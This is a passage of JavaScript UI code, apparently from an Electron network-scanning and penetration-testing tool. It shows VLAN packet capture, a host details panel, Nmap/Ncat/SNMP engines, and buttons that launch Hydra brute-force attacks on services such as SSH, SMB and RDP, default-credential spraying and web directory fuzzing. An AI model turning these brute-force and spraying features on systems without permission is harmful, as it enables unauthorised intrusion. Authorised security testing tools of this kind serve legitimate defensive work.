  if (isVlanCapturing) {
    // Stop Capture
    const res = await api.stopTsharkCapture();
    if (res.status === 'stopped') {
      isVlanCapturing = false;
      btnStartVlanCapture.innerHTML = `<span class="icon">▶️</span> Start Capture`;
      btnStartVlanCapture.classList.remove('danger', 'pulsing');
      btnStartVlanCapture.classList.add('primary');
      vlanInterfaceSelect.disabled = false;
      btnRefreshVlanInterfaces.disabled = false;
    }
  } else {
    // Start Capture
    const iface = vlanInterfaceSelect.value;
    if (!iface) {
       alert('Please select a network interface first.');
       return;
    }
    
    vlanResultsContainer.innerHTML = ''; // clear old
    if(vlanEmptyState) vlanEmptyState.style.display = 'none';
    vlanTagsDetected.clear();
    vlanCountSpan.textContent = '0';
    
    const res = await api.startTsharkCapture(iface);
    if (res.status === 'started') {
      isVlanCapturing = true;
      btnStartVlanCapture.innerHTML = `<span class="icon">🛑</span> Stop Capture`;
      btnStartVlanCapture.classList.remove('primary');
      btnStartVlanCapture.classList.add('danger', 'pulsing');
      vlanInterfaceSelect.disabled = true;
      btnRefreshVlanInterfaces.disabled = true;
    }
  }
});

async function refreshVlanInterfaces() {
  btnRefreshVlanInterfaces.disabled = true;
  vlanInterfaceSelect.innerHTML = '<option value="">Loading...</option>';
  try {
    const interfaces = await api.getInterfaces();
    vlanInterfaceSelect.innerHTML = '<option value="">Select Interface...</option>';
    interfaces.forEach(iface => {
      const opt = document.createElement('option');
      opt.value = iface.name; 
      opt.textContent = `${iface.name} (${iface.ip})`;
      vlanInterfaceSelect.appendChild(opt);
    });
  } catch (e) {
    vlanInterfaceSelect.innerHTML = '<option value="">Error Loading</option>';
  } finally {
    btnRefreshVlanInterfaces.disabled = false;
  }
}

// Tshark Event Handlers
window.electronAPI.onTsharkVlanFound((data) => {
  console.log('VLAN tag found:', data);
  const key = `vlan-${data.vlan}`;
  
  if (!vlanTagsDetected.has(data.vlan)) {
    vlanTagsDetected.add(data.vlan);
    vlanCountSpan.textContent = vlanTagsDetected.size;
    
    const el = document.createElement('div');
    el.className = 'ds-record selectable-text';
    el.id = key;
    el.style.borderLeftColor = 'var(--info)';
    const header = document.createElement('div');
    header.className = 'ds-header';
    header.style.alignItems = 'center';

    const titleDiv = document.createElement('div');
    titleDiv.className = 'ds-header-title';

    const portSpan = document.createElement('span');
    portSpan.className = 'ds-port selectable-text';
    portSpan.textContent = `VLAN ${data.vlan}`;

    const serviceSpan = document.createElement('span');
    serviceSpan.className = 'ds-service';
    serviceSpan.style.marginLeft = '8px';
    serviceSpan.textContent = '802.1Q Tag';

    titleDiv.appendChild(portSpan);
    titleDiv.appendChild(serviceSpan);

    const copyBtn = document.createElement('button');
    copyBtn.className = 'btn icon-only copy-vlan';
    copyBtn.title = 'Copy to clipboard';
    copyBtn.dataset.vlan = data.vlan;
    copyBtn.dataset.src = data.srcMac;
    copyBtn.dataset.dst = data.dstMac;
    copyBtn.textContent = '📋';

    header.appendChild(titleDiv);
    header.appendChild(copyBtn);

    const detailsDiv = document.createElement('div');
    detailsDiv.className = 'ds-details';
    detailsDiv.style.fontSize = '11px';
    detailsDiv.style.marginTop = '4px';
    detailsDiv.textContent = 'Captured between ';

    const srcMacSpan = document.createElement('span');
    srcMacSpan.className = 'selectable-text';
    srcMacSpan.style.fontFamily = 'monospace';
    srcMacSpan.textContent = data.srcMac;

    const andText = document.createTextNode(' and ');

    const dstMacSpan = document.createElement('span');
    dstMacSpan.className = 'selectable-text';
    dstMacSpan.style.fontFamily = 'monospace';
    dstMacSpan.textContent = data.dstMac;

    detailsDiv.appendChild(srcMacSpan);
    detailsDiv.appendChild(andText);
    detailsDiv.appendChild(dstMacSpan);

    el.appendChild(header);
    el.appendChild(detailsDiv);
    vlanResultsContainer.appendChild(el);

    // Attach copy event listener explicitly to this new button
    if (copyBtn) {
      copyBtn.addEventListener('click', () => {
         const textToCopy = `VLAN ID: ${data.vlan}\nSource MAC: ${data.srcMac}\nDest MAC: ${data.dstMac}`;
         navigator.clipboard.writeText(textToCopy);
         const originalText = copyBtn.innerText;
         copyBtn.innerText = '✔️';
         setTimeout(() => { copyBtn.innerText = originalText; }, 2000);
      });
    }
  }
});

window.electronAPI.onTsharkError((err) => {
  const el = document.createElement('div');
  el.className = 'ds-record';
  el.style.borderLeftColor = 'var(--danger)';
  const errHeader = document.createElement('div');
  errHeader.style.color = 'var(--danger)';
  errHeader.style.fontSize = '12px';
  errHeader.style.fontWeight = 'bold';
  errHeader.textContent = 'Capture Error';

  const errBody = document.createElement('div');
  errBody.style.color = 'var(--text-muted)';
  errBody.style.fontSize = '11px';
  errBody.style.marginTop = '4px';
  errBody.style.whiteSpace = 'pre-wrap';
  errBody.textContent = err;

  el.appendChild(errHeader);
  el.appendChild(errBody);
  vlanResultsContainer.appendChild(el);
});

window.electronAPI.onTsharkComplete(({ code }) => {
  isVlanCapturing = false;
  btnStartVlanCapture.innerHTML = `<span class="icon">▶️</span> Start Capture`;
  btnStartVlanCapture.classList.remove('danger', 'pulsing');
  btnStartVlanCapture.classList.add('primary');
  vlanInterfaceSelect.disabled = false;
  btnRefreshVlanInterfaces.disabled = false;
  
  const el = document.createElement('div');
  el.style.textAlign = 'center';
  el.style.color = 'var(--text-muted)';
  el.style.fontSize = '11px';
  el.style.marginTop = '8px';
  el.textContent = `Capture ended (Code ${code})`;
  vlanResultsContainer.appendChild(el);
});

// --- Details Panel Logic ---
function renderActionButtons(container, ip, data) {
  if (data.port === 80 || data.port === 8080) {
    const btn = document.createElement('button');
    btn.className = 'btn-action';
    btn.innerHTML = '<span class="icon">🌐</span> Open HTTP';
    btn.addEventListener('click', () => window.electronAPI.openExternalAction({type:'http', ip, port: data.port}));
    container.appendChild(btn);
  } else if (data.port === 443 || data.port === 8443) {
    const btn = document.createElement('button');
    btn.className = 'btn-action';
    btn.innerHTML = '<span class="icon">🔒</span> Open HTTPS';
    btn.addEventListener('click', () => window.electronAPI.openExternalAction({type:'https', ip, port: data.port}));
    container.appendChild(btn);
  } else if (data.port === 22) {
    const wrapper = document.createElement('div');
    wrapper.style.cssText = 'display:flex; gap: 4px; align-items: center;';
    
    const input = document.createElement('input');
    input.type = 'text';
    input.className = 'text-input';
    input.style.cssText = 'width: 70px; padding: 4px 6px; font-size: 11px;';
    input.placeholder = 'root';
    input.value = 'root';
    input.title = 'SSH Username';
    
    const btn = document.createElement('button');
    btn.className = 'btn-action';
    btn.innerHTML = '<span class="icon">⌨️</span> Connect SSH';
    btn.addEventListener('click', () => {
      window.electronAPI.openExternalAction({type:'ssh', ip, username: input.value || 'root'});
    });
    
    wrapper.appendChild(input);
    wrapper.appendChild(btn);
    container.appendChild(wrapper);
  } else if (data.port === 3389) {
    const btn = document.createElement('button');
    btn.className = 'btn-action';
    btn.innerHTML = '<span class="icon">🖥️</span> Remote Desktop';
    btn.addEventListener('click', () => window.electronAPI.openExternalAction({type:'rdp', ip}));
    container.appendChild(btn);
  }

  // Brute-Force action for brute-forceable ports
  const bfPorts = { 22: 'ssh', 21: 'ftp', 445: 'smb', 3389: 'rdp', 80: 'http-get', 8080: 'http-get', 23: 'telnet', 3306: 'mysql', 1433: 'mssql', 5432: 'postgres', 5900: 'vnc' };
  if (bfPorts[data.port] && state.isHydraInstalled) {
    const bfBtn = document.createElement('button');
    bfBtn.className = 'btn-action pentest-action hydra-only';
    bfBtn.innerHTML = '<span class="icon">⚔️</span> Brute-Force';
    bfBtn.addEventListener('click', () => {
      openBruteForceModal(ip, data.port, bfPorts[data.port]);
    });
    container.appendChild(bfBtn);
  }
}

function openDetailsPanel(host) {
  function renderSavedHistory(host) {
    const dsResultsContainer = document.getElementById('deep-scan-results');
    const nmapResultsContainer = document.getElementById('nmap-scan-results');
    if (!dsResultsContainer || !nmapResultsContainer) return;

    if (host.deepAudit && host.deepAudit.history && host.deepAudit.history.length > 0) {
      host.deepAudit.history.forEach(data => {
        const record = document.createElement('div');
        record.className = 'ds-record';
        if (data.vulnerable) {
          record.style.borderLeftColor = 'var(--danger)';
          record.style.background = 'rgba(235,94,94,0.05)';
        }

        const headerNode = document.createElement('div');
        headerNode.className = 'ds-header';

        const titleNode = document.createElement('div');
        titleNode.className = 'ds-header-title';

        const portSpan = document.createElement('span');
        portSpan.className = 'ds-port';
        portSpan.textContent = `PORT ${data.port}`;

        const serviceSpan = document.createElement('span');
        serviceSpan.className = 'ds-service';
        serviceSpan.textContent = data.serviceName;

        titleNode.appendChild(portSpan);
        titleNode.appendChild(serviceSpan);

        if (data.vulnerable) {
          const cl = data.severity === 'critical' ? 'danger' : 'warning';
          const tag = document.createElement('span');
          tag.style.cssText = `font-size: 10px; color: var(--${cl}); border: 1px solid var(--${cl}); padding: 2px 4px; border-radius: 2px;`;
          tag.textContent = data.severity.toUpperCase();
          titleNode.appendChild(tag);
        }

        headerNode.appendChild(titleNode);
        
        const actionsContainer = document.createElement('div');
        actionsContainer.className = 'ds-actions';
        // Hydrate actions via innerHTML for complex buttons but since these are hardcoded patterns it's relatively safe
        renderActionButtons(actionsContainer, host.ip, data);
        headerNode.appendChild(actionsContainer);

        const detailsDiv = document.createElement('div');
        detailsDiv.className = 'ds-details';
        if (data.vulnerable) {
          detailsDiv.style.color = 'var(--danger)';
          detailsDiv.style.fontWeight = '500';
        }
        detailsDiv.textContent = data.details;

        record.appendChild(headerNode);
        record.appendChild(detailsDiv);

        if (data.rawBanner) {
          const bannerDiv = document.createElement('div');
          bannerDiv.className = 'ds-banner';
          bannerDiv.textContent = data.rawBanner;
          record.appendChild(bannerDiv);
        }

        dsResultsContainer.appendChild(record);
      });
    }

    if (host.nmapData) {
      ['deep', 'host', 'vuln'].forEach(type => {
        if (host.nmapData[type]) {
          const record = document.createElement('div');
          record.className = 'ds-record';
          const service = document.createElement('div');
          service.className = 'ds-service';
          service.textContent = `Saved Nmap ${type.toUpperCase()} Scan`;
          const banner = document.createElement('div');
          banner.className = 'ds-banner';
          banner.textContent = host.nmapData[type];
          record.appendChild(service);
          record.appendChild(banner);
          nmapResultsContainer.appendChild(record);
        }
      });
      if (host.nmapData.ports) {
        Object.keys(host.nmapData.ports).forEach(port => {
          const record = document.createElement('div');
          record.className = 'ds-record';
          const service = document.createElement('div');
          service.className = 'ds-service';
          service.textContent = `Saved Nmap Port Scan (Port ${port})`;
          const banner = document.createElement('div');
          banner.className = 'ds-banner';
          banner.textContent = host.nmapData.ports[port];
          record.appendChild(service);
          record.appendChild(banner);
          nmapResultsContainer.appendChild(record);
        });
      }
    }
  }

  elements.detailsContent.innerHTML = `
    <div class="info-row">
      <span class="label">IP Address</span>
      <div class="value" id="dp-field-ip"></div>
    </div>
    <div class="info-row">
      <span class="label">MAC Address</span>
      <div class="value" style="font-family: monospace;" id="dp-field-mac"></div>
    </div>
    <div class="info-row">
      <span class="label">Hostname</span>
      <div class="value" id="dp-hostname"></div>
    </div>
    <div class="info-row">
      <span class="label">Operating System</span>
      <div class="value" id="dp-os"></div>
    </div>
    <div class="info-row" id="dp-device-row" style="display: none;">
      <span class="label">Device Type</span>
      <div class="value" id="dp-device"></div>
    </div>
    <div class="info-row" id="dp-kernel-row" style="display: none;">
      <span class="label" style="min-width: 60px;">Kernel</span>
      <div class="value" id="dp-kernel" style="text-align: right;"></div>
    </div>
    <div class="info-row">
      <span class="label">Hardware Vendor</span>
      <div class="value" id="dp-vendor"></div>
    </div>
    
    <div style="margin-top: 10px; border-top: 1px solid var(--border-glass); padding-top: 16px;">
      <span class="label" style="display:block; margin-bottom: 12px; font-weight: 500; font-size: 14px; color: white;">Open Ports</span>
      <div id="dp-ports-container"></div>
    </div>
    
    <div id="dp-vulns-section" style="display: none; margin-top: 10px; border-top: 1px solid var(--border-glass); padding-top: 16px;">
      <span class="label" style="display:block; margin-bottom: 12px; font-weight: 500; font-size: 14px; color: var(--danger);">Vulnerabilities Discovered</span>
      <div style="display: flex; flex-direction: column; gap: 8px;" id="dp-vulns-container"></div>
    </div>
    
    <div id="dp-routing-section" style="display: none; margin-top: 10px; border-top: 1px solid var(--border-glass); padding-top: 16px;">
      <span class="label" style="display:block; margin-bottom: 12px; font-weight: 500; font-size: 14px; color: var(--info);">Known Routing Paths (Subnets)</span>
      <div id="dp-routing-container" style="display: flex; flex-wrap: wrap; gap: 6px;"></div>
    </div>
    
    <div id="dp-processes-section" style="display: none; margin-top: 10px; border-top: 1px solid var(--border-glass); padding-top: 16px;">
      <span class="label" style="display:block; margin-bottom: 12px; font-weight: 500; font-size: 14px; color: var(--warning);">Active Running Processes</span>
      <div id="dp-processes-container" style="display: flex; flex-wrap: wrap; gap: 6px; max-height: 200px; overflow-y: auto;"></div>
    </div>
    
    <div class="deep-scan-container" style="margin-top: 10px;">
      <div style="display: flex; gap: 8px; margin-bottom: 12px; align-items: center; background: rgba(0,0,0,0.2); border-radius: 6px; padding: 4px; border: 1px solid var(--border-glass); justify-content: center; flex-wrap: wrap;">
        <span style="font-size: 12px; color: var(--text-muted); margin-right: 4px;">Engine:</span>
        <button id="btn-engine-native" class="btn icon-only active" title="Native Scanner" style="padding: 4px 12px; border-radius: 4px; font-size: 12px; height: 24px; box-shadow: none;">Native</button>
        <button id="btn-engine-nmap" class="btn icon-only" title="Nmap Scanner" style="padding: 4px 12px; border-radius: 4px; font-size: 12px; height: 24px; box-shadow: none;">Nmap</button>
        <button id="btn-engine-ncat" class="btn icon-only" title="Ncat Netcat" style="padding: 4px 12px; border-radius: 4px; font-size: 12px; height: 24px; box-shadow: none;">Ncat</button>
        <button id="btn-engine-snmp" class="btn icon-only" title="SNMP Walker" style="padding: 4px 12px; border-radius: 4px; font-size: 12px; height: 24px; box-shadow: none;">SNMP</button>
        <button id="btn-engine-pcap" class="btn icon-only" title="PCAP Analysis" style="padding: 4px 12px; border-radius: 4px; font-size: 12px; height: 24px; box-shadow: none;">PCAP</button>
      </div>

      <!-- Native Actions -->
      <div id="native-actions">
        <button id="btn-run-deep-scan" class="btn warning full-width">
          <span class="icon">☢️</span> <span id="ds-run-label">Run Deep Scan</span>
        </button>
      </div>

      <!-- Nmap Actions -->
      <div id="nmap-actions" style="display: none; flex-direction: column; gap: 8px;">
        <button id="btn-nmap-deep" class="btn warning full-width" title="Aggressive scan all 65k ports">
          <span class="icon">☢️</span> Nmap Deep Scan (All Ports)
        </button>
        <button id="btn-nmap-host" class="btn info full-width" title="Standard host scan">
          <span class="icon">🖥️</span> Nmap Standard Host Scan
        </button>
        <button id="btn-nmap-vuln" class="btn danger full-width" title="Run Nmap vulnerability scripts">
          <span class="icon">🛡️</span> Nmap Vuln Scan (Scripts)
        </button>
        
        <div style="margin-top: 8px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 12px;">
           <span style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 6px;">Nmap Scripting Engine (NSE) Explorer</span>
           <div style="display: flex; flex-direction: column; gap: 6px;">
              <div style="position: relative;">
                 <input type="text" id="nse-search-input" class="text-input full-width" autocomplete="off">
                 <div id="nse-dropdown" class="nse-dropdown"></div>
              </div>
              <input type="text" id="nse-args-input" class="text-input full-width" placeholder="Optional: --script-args user=admin">
              <button id="btn-nmap-custom" class="btn primary full-width" disabled>
                 <span class="icon">🚀</span> Run Custom Script
              </button>
           </div>
        </div>
      </div>

      <!-- Ncat Actions -->
      <div id="ncat-actions" style="display: none; flex-direction: column; gap: 8px; background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; border: 1px solid var(--border-glass);">
        <div style="display: flex; gap: 8px;">
          <input type="number" id="input-ncat-port" class="text-input" placeholder="Port" style="width: 80px;" min="1" max="65535">
          <input type="text" id="input-ncat-payload" class="text-input" placeholder="Payload (e.g. GET / HTTP/1.0)" style="flex-grow: 1;">
        </div>
        <button id="btn-run-ncat" class="btn primary full-width" title="Launch Ncat connection">
          <span class="icon">🔌</span> Connect & Send
        </button>
      </div>

      <!-- SNMP Actions -->
      <div id="snmp-actions" style="display: none; flex-direction: column; gap: 8px; background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; border: 1px solid var(--border-glass);">
        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
          <select id="input-snmp-version" class="dropdown-select" style="width: 80px;">
            <option value="v1">v1</option>
            <option value="v2c" selected>v2c</option>
            <option value="v3">v3</option>
          </select>
          <input type="text" id="input-snmp-community" class="text-input" placeholder="Community (e.g. public)" style="flex-grow: 1;" value="public">
        </div>
        
        <div id="snmp-v3-auth" style="display: none; flex-direction: column; gap: 8px;">
          <input type="text" id="input-snmp-user" class="text-input full-width" placeholder="Username (v3)">
          <div style="display: flex; gap: 8px;">
            <select id="input-snmp-auth-proto" class="dropdown-select" style="width: 80px;">
              <option value="sha">SHA</option>
              <option value="md5">MD5</option>
            </select>
            <input type="password" id="input-snmp-auth-key" class="text-input" placeholder="Auth Password" style="flex-grow: 1;">
          </div>
          <div style="display: flex; gap: 8px;">
            <select id="input-snmp-priv-proto" class="dropdown-select" style="width: 80px;">
              <option value="aes">AES</option>
              <option value="des">DES</option>
            </select>
            <input type="password" id="input-snmp-priv-key" class="text-input" placeholder="Priv Password" style="flex-grow: 1;">
          </div>
        </div>

        <button id="btn-run-snmp" class="btn info full-width" title="Walk MIB Tree">
          <span class="icon">📡</span> SNMP Walk
        </button>
      </div>

      <!-- PCAP Actions -->
      <div id="pcap-actions" style="display: none; flex-direction: column; gap: 8px; background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; border: 1px solid var(--border-glass);">
        <div style="font-size: 12px; color: var(--text-muted); text-align: center; margin-bottom: 4px;">Start a live packet capture filtered for this host.</div>
        <button id="btn-run-pcap" class="btn primary full-width" title="Open PCAP Capture Panel">
          <span class="icon">📦</span> Capture Packets
        </button>
      </div>

      <!-- Results Containers -->
      <div id="deep-scan-results" class="deep-scan-results selectable-text"></div>
      <div id="nmap-scan-results" class="selectable-text" style="display: none; margin-top: 12px; flex-direction: column; gap: 8px;"></div>
      <div id="snmp-scan-results" class="selectable-text" style="display: none; margin-top: 12px; flex-direction: column; gap: 8px;">
        <div style="display: flex; justify-content: flex-end; margin-bottom: 4px;">
          <button id="btn-export-snmp" style="display: none;" class="btn small success" title="Download SNMP Results (CSV)">
            <span class="icon">⬇️</span> Export CSV
          </button>
        </div>
        <div id="snmp-progress-container" style="display: none; margin-bottom: 8px;">
          <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 4px; color: var(--text-muted);">
            <span>Walking Tree...</span>
            <span id="snmp-progress-count">0 OIDs</span>
          </div>
          <div class="progress-bar-bg" style="height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden;">
            <div id="snmp-progress-fill" class="progress-bar-fill" style="width: 100%; height: 100%; background: var(--info); animation: progress-indeterminate 1.5s infinite linear; transform-origin: left;"></div>
          </div>
        </div>
        <div id="snmp-data-container" style="display: flex; flex-direction: column; gap: 8px;"></div>
      </div>
    </div>
  `;

  // Hydrate DOM safely
  document.getElementById('dp-header-ip').textContent = host.ip;
  document.getElementById('dp-field-ip').textContent = host.ip;
  document.getElementById('dp-field-mac').textContent = host.mac || 'Unknown';
  document.getElementById('dp-hostname').textContent = host.hostname || 'Unknown';
  document.getElementById('dp-os').textContent = host.os || 'Unknown';
  document.getElementById('dp-vendor').textContent = host.vendor || 'Unknown';
  
  if (host.deviceType) {
    document.getElementById('dp-device-row').style.display = 'flex';
    document.getElementById('dp-device').textContent = host.deviceType;
  }
  if (host.kernel) {
    document.getElementById('dp-kernel-row').style.display = 'flex';
    document.getElementById('dp-kernel').textContent = host.kernel;
  }

  const portsList = document.getElementById('dp-ports-container');
  if (host.ports && host.ports.length > 0) {
    host.ports.forEach(p => {
      const sp = document.createElement('span');
      sp.className = 'port-item';
      sp.setAttribute('data-port', p);
      sp.style.cursor = 'pointer';
      sp.title = `Click to Nmap Scan Port ${p}`;
      sp.textContent = p;
      portsList.appendChild(sp);
    });
  } else {
    portsList.insertAdjacentHTML('beforeend', '<span class="value">No common open ports detected.</span>');
  }

  // Share Enumeration quick-action for SMB hosts (port 139/445)
  if (host.ports && (host.ports.includes(445) || host.ports.includes(139)) && state.isSmbclientInstalled) {
    const shareSection = document.createElement('div');
    shareSection.className = 'smbclient-only';
    shareSection.style.cssText = 'margin-top: 10px; display: flex; align-items: center; gap: 8px;';
    const shareLabel = document.createElement('span');
    shareLabel.style.cssText = 'font-size: 11px; color: var(--text-muted);';
    shareLabel.textContent = '📂 Shares:';
    shareSection.appendChild(shareLabel);
    const shareBtn = document.createElement('button');
    shareBtn.className = 'btn-action pentest-action';
    shareBtn.style.cssText = 'font-size: 10px; padding: 3px 8px;';
    shareBtn.textContent = 'Enumerate Shares';
    shareBtn.addEventListener('click', () => openSharePanel(host.ip));
    shareSection.appendChild(shareBtn);
    portsList.parentElement.appendChild(shareSection);
  }

  // Dir Fuzzer quick-action for HTTP/HTTPS hosts
  if (host.ports) {
    const HTTP_PORTS = [80, 443, 8080, 8443, 8000, 8888, 3000, 5000];
    const webPorts = host.ports.filter(p => HTTP_PORTS.includes(p));
    if (webPorts.length > 0) {
      const fuzzSection = document.createElement('div');
      fuzzSection.style.cssText = 'margin-top: 10px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap;';
      const fuzzLabel = document.createElement('span');
      fuzzLabel.style.cssText = 'font-size: 11px; color: var(--text-muted);';
      fuzzLabel.textContent = '🔎 Dir Fuzz:';
      fuzzSection.appendChild(fuzzLabel);
      webPorts.forEach(port => {
        const scheme = (port === 443 || port === 8443) ? 'https' : 'http';
        const url = `${scheme}://${host.ip}:${port}`;
        const btn = document.createElement('button');
        btn.className = 'btn-action pentest-action';
        btn.style.cssText = 'font-size: 10px; padding: 3px 8px;';
        btn.textContent = `${scheme.toUpperCase()}:${port}`;
        btn.title = `Fuzz web directories on ${url}`;
        btn.addEventListener('click', () => {
          if (typeof openDirFuzzPanel !== 'undefined') openDirFuzzPanel(url);
          else if (window.__openDirFuzzPanel) window.__openDirFuzzPanel(url);
        });
        fuzzSection.appendChild(btn);
      });
      portsList.parentElement.appendChild(fuzzSection);
    }
  }

  // Brute-Force quick-actions for detected ports (visible when Hydra is installed + enabled)
  if (host.ports && host.ports.length > 0 && state.isHydraInstalled) {
    const bfPorts = { 22: 'ssh', 21: 'ftp', 445: 'smb', 3389: 'rdp', 80: 'http-get', 8080: 'http-get', 23: 'telnet', 3306: 'mysql', 1433: 'mssql', 5432: 'postgres', 5900: 'vnc' };
    const matchingPorts = host.ports.filter(p => bfPorts[p]);
    if (matchingPorts.length > 0) {
      const bfSection = document.createElement('div');
      bfSection.className = 'hydra-only';
      bfSection.style.cssText = 'margin-top: 12px; display: flex; flex-wrap: wrap; gap: 6px; align-items: center;';
      
      const bfLabel = document.createElement('span');
      bfLabel.style.cssText = 'font-size: 11px; color: var(--text-muted); margin-right: 4px;';
      bfLabel.textContent = '⚔️ Brute-Force:';
      bfSection.appendChild(bfLabel);

      matchingPorts.forEach(port => {
        const btn = document.createElement('button');
        btn.className = 'btn-action pentest-action';
        btn.style.cssText = 'font-size: 10px; padding: 3px 8px;';
        btn.innerHTML = `${bfPorts[port].toUpperCase()} :${port}`;
        btn.title = `Brute-force ${bfPorts[port]} on port ${port}`;
        btn.addEventListener('click', () => {
          openBruteForceModal(host.ip, port, bfPorts[port]);
        });
        bfSection.appendChild(btn);
      });

      portsList.parentElement.appendChild(bfSection);
    }

    // Default Credential Spray quick-action
    const sprayablePorts = host.ports.filter(p => [23, 80, 8080, 8443, 443].includes(p));
    if (sprayablePorts.length > 0) {
      const spraySection = createCredSprayQuickAction(host.ip);
      portsList.parentElement.appendChild(spraySection);
    }
  }

  if (host.nmapData && host.nmapData.vulnerabilities && host.nmapData.vulnerabilities.length > 0) {
    document.getElementById('dp-vulns-section').style.display = 'block';
    const vContainer = document.getElementById('dp-vulns-container');
    host.nmapData.vulnerabilities.forEach(v => {
      const vDiv = document.createElement('div');
      vDiv.style.cssText = 'background: rgba(235,94,94,0.05); border-left: 3px solid var(--danger); padding: 8px; font-size: 12px; border-radius: 4px;';
      const vHeader = document.createElement('div');
      vHeader.style.cssText = 'font-weight: 600; font-family: monospace; color: var(--danger); margin-bottom: 4px;';
      vHeader.textContent = `${v.id} (${v.severity.toUpperCase()})`;
      const vBody = document.createElement('div');
      vBody.style.cssText = 'color: var(--text-muted); line-height: 1.4; white-space: pre-wrap; word-break: break-all;';
      vBody.textContent = v.details;
      
      vDiv.appendChild(vHeader);
      vDiv.appendChild(vBody);
      vContainer.appendChild(vDiv);
    });
  }

  if (host.routing && host.routing.length > 0) {
    document.getElementById('dp-routing-section').style.display = 'block';
    const rContainer = document.getElementById('dp-routing-container');
    host.routing.forEach(r => {
      const sp = document.createElement('span');
      sp.className = 'port-item'; // repurpose badge style
      sp.style.background = 'var(--info)';
      sp.style.color = '#fff';
      sp.textContent = r;
      rContainer.appendChild(sp);
    });
  }

  if (host.processes && host.processes.length > 0) {
    document.getElementById('dp-processes-section').style.display = 'block';
    const pContainer = document.getElementById('dp-processes-container');
    host.processes.forEach(p => {
      const sp = document.createElement('span');
      sp.className = 'port-item';
      sp.style.background = 'rgba(255,255,255,0.1)';
      sp.style.border = '1px solid var(--border-glass)';
      sp.textContent = p;
      pContainer.appendChild(sp);
    });
  }

  document.getElementById('btn-run-deep-scan').setAttribute('data-ip', host.ip);
  if (host.deepAudit && host.deepAudit.history.length > 0) {
    document.getElementById('ds-run-label').textContent = 'Re-Run Deep Scan';
  }
  
  document.getElementById('btn-nmap-deep').setAttribute('data-ip', host.ip);
  document.getElementById('btn-nmap-host').setAttribute('data-ip', host.ip);
  document.getElementById('btn-nmap-vuln').setAttribute('data-ip', host.ip);
  document.getElementById('btn-nmap-custom').setAttribute('data-ip', host.ip);
  document.getElementById('btn-run-ncat').setAttribute('data-ip', host.ip);
  document.getElementById('btn-run-pcap').setAttribute('data-ip', host.ip);
  document.getElementById('nse-search-input').placeholder = `Search ${state.nmapScripts?.length || 0} scripts (e.g. smb-)`;

  // --- Hardening Monitor Section ---
  {
    const portsParent = portsList.parentElement;
    renderHardeningMonitorSection(host, portsParent);
  }

  renderSavedHistory(host);
  elements.detailsPanel.classList.add('open');
  elements.sidebarResizer.style.display = 'block';

  attachDetailsPanelListeners(host);
  
  // Re-apply settings to hide Nmap buttons if disabled
  window.electronAPI.settings.getAll().then(settings => applySettingsUI(settings));
}

function attachDetailsPanelListeners(host) {
  const btnRunDeepScan = document.getElementById('btn-run-deep-scan');
  const btnEngineNative = document.getElementById('btn-engine-native');
  const btnEngineNmap = document.getElementById('btn-engine-nmap');
  const btnEngineNcat = document.getElementById('btn-engine-ncat');
  
  const nativeActions = document.getElementById('native-actions');
  const nmapActions = document.getElementById('nmap-actions');
  const ncatActions = document.getElementById('ncat-actions');
  const snmpActions = document.getElementById('snmp-actions');
  const pcapActions = document.getElementById('pcap-actions');
  
  const dsResults = document.getElementById('deep-scan-results');
  const nmapScanResults = document.getElementById('nmap-scan-results');
  const snmpScanResults = document.getElementById('snmp-scan-results');

  const btnEngineSnmp = document.getElementById('btn-engine-snmp');
  const btnEnginePcap = document.getElementById('btn-engine-pcap');

  btnEngineNative.addEventListener('click', () => {
    btnEngineNative.classList.add('active');
    btnEngineNmap.classList.remove('active');
    btnEngineNcat.classList.remove('active');
    btnEngineSnmp.classList.remove('active');
    btnEnginePcap.classList.remove('active');
    nativeActions.style.display = 'block';
    nmapActions.style.display = 'none';
    ncatActions.style.display = 'none';
    snmpActions.style.display = 'none';
    pcapActions.style.display = 'none';
    dsResults.style.display = 'flex';
    nmapScanResults.style.display = 'none';
    snmpScanResults.style.display = 'none';
  });

  btnEngineNmap.addEventListener('click', () => {
    if (!state.isNmapInstalled) {
       elements.nmapInstallBanner.style.display = 'block';
       return;
    }
    btnEngineNmap.classList.add('active');
    btnEngineNative.classList.remove('active');
    btnEngineNcat.classList.remove('active');
    btnEngineSnmp.classList.remove('active');
    btnEnginePcap.classList.remove('active');
    nmapActions.style.display = 'flex';
    nativeActions.style.display = 'none';
    ncatActions.style.display = 'none';
    snmpActions.style.display = 'none';
    pcapActions.style.display = 'none';
    nmapScanResults.style.display = 'flex';
    dsResults.style.display = 'none';
    snmpScanResults.style.display = 'none';
  });

  btnEngineNcat.addEventListener('click', () => {
    if (!state.isNmapInstalled) {
       elements.nmapInstallBanner.style.display = 'block';
       return;
    }
    btnEngineNcat.classList.add('active');
    btnEngineNative.classList.remove('active');
    btnEngineNmap.classList.remove('active');
    btnEngineSnmp.classList.remove('active');
    btnEnginePcap.classList.remove('active');
    ncatActions.style.display = 'flex';
    nativeActions.style.display = 'none';
    nmapActions.style.display = 'none';
    snmpActions.style.display = 'none';
    pcapActions.style.display = 'none';
    nmapScanResults.style.display = 'flex';
    dsResults.style.display = 'none';
    snmpScanResults.style.display = 'none';
  });

  btnEngineSnmp.addEventListener('click', () => {
    btnEngineSnmp.classList.add('active');
    btnEngineNative.classList.remove('active');
    btnEngineNmap.classList.remove('active');
    btnEngineNcat.classList.remove('active');
    btnEnginePcap.classList.remove('active');
    snmpActions.style.display = 'flex';
    nativeActions.style.display = 'none';
    nmapActions.style.display = 'none';
    ncatActions.style.display = 'none';
    pcapActions.style.display = 'none';
    snmpScanResults.style.display = 'flex';
    dsResults.style.display = 'none';
    nmapScanResults.style.display = 'none';
  });

  btnEnginePcap.addEventListener('click', () => {
    btnEnginePcap.classList.add('active');
    btnEngineNative.classList.remove('active');
    btnEngineNmap.classList.remove('active');
    btnEngineNcat.classList.remove('active');
    btnEngineSnmp.classList.remove('active');
    pcapActions.style.display = 'flex';
    nativeActions.style.display = 'none';
    nmapActions.style.display = 'none';
    ncatActions.style.display = 'none';
    snmpActions.style.display = 'none';
    snmpScanResults.style.display = 'none';
    dsResults.style.display = 'none';
